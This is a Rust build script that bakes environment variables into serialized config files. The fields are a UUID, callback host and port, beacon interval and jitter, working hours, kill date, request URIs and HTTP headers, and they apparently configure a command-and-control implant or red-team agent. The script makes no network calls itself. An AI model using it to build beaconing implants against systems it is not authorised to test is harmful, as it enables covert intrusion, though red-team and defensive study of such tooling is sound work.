//! Build script for transforming the configuration

use std::io::Write;

use base64::Engine;

include!("src/structs.rs");

fn main() {
    let out_dir = std::env::var("OUT_DIR").expect("Failed to get the 'OUT_DIR' value");

    let config_data = ConfigVars {
        connection_retries: env!("CONNECTION_RETRIES")
            .parse()
            .expect("Failed to parse the CONNECTION_RETRIES"),
        uuid: env!("UUID"),
        working_hours_end: env!("WORKING_HOURS_END")
            .parse()
            .expect("Failed to parse the WORKING_HOURS_END"),
        working_hours_start: env!("WORKING_HOURS_START")
            .parse()
            .expect("Failed to parse the WORKING_HOURS_START"),
    };

    let mut config_file = std::fs::OpenOptions::new()
        .read(true)
        .write(true)
        .create(true)
        .open(format!("{}/config.bin", out_dir))
        .expect("Failed to open the config output file");

    config_file
        .write_all(&rmp_serde::to_vec(&config_data).expect("Failed to serialize the config"))
        .expect("Failed to write the serialized config to the output file");

    if let Some(callback_host) = option_env!("HTTP_CALLBACK_HOST") {
        let headers = base64::engine::general_purpose::STANDARD
            .decode(env!("HTTP_HEADERS"))
            .expect("Failed to base64 decode the HTTP_HEADERS");

        let headers: HashMap<&str, &str> =
            serde_json::from_slice(&headers).expect("Failed to JSON deserialize the HTTP_HEADERS");

        let http_config = HttpConfigVars {
            callback_host,
            callback_interval: env!("HTTP_CALLBACK_INTERVAL")
                .parse()
                .expect("Failed to parse the HTTP_CALLBACK_INTERVAL"),
            callback_jitter: env!("HTTP_CALLBACK_JITTER")
                .parse()
                .expect("Failed to parse the HTTP_CALLBACK_JITTER"),
            callback_port: env!("HTTP_CALLBACK_PORT")
                .parse()
                .expect("Failed to parse the HTTP_CALLBACK_PORT"),
            get_uri: env!("HTTP_GET_URI"),
            headers,
            killdate: env!("HTTP_KILLDATE")
                .parse()
                .expect("Failed to parse the HTTP_KILLDATE"),
            post_uri: env!("HTTP_POST_URI"),
            query_path_name: env!("HTTP_QUERY_PATH_NAME"),
        };

        let mut http_config_file = std::fs::OpenOptions::new()
            .read(true)
            .write(true)
            .create(true)
            .open(format!("{}/config.http.bin", out_dir))
            .expect("Failed to open the http config output file");

        http_config_file
            .write_all(
                &rmp_serde::to_vec(&http_config).expect("Failed to serialize the http config"),
            )
            .expect("Failed to write the serialized http config");
    }
}
